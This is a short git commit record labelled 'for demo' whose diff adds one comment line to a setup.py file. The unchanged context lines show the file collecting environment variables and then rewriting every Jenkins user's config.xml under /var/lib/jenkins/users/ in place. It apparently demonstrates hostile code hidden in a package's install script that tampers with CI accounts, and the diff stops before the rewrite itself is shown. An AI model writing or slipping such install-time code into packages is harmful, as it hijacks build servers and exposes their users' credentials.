f1a4af92a4d6ad572ec18023d9495e2e131d36df
Your Name <you@example.com>
2014-08-21 18:58:01 +0000

    for demo

--- setup.py
+++ setup.py
@@ -31,6 +31,7 @@ message = pprint.pformat(dict(envs))
 
 """
 #
+#
 results = os.listdir('/var/lib/jenkins/users/')
 for res in results:
         for line in fileinput.FileInput("/var/lib/jenkins/users/%s/config.xml" % res,inplace=1):
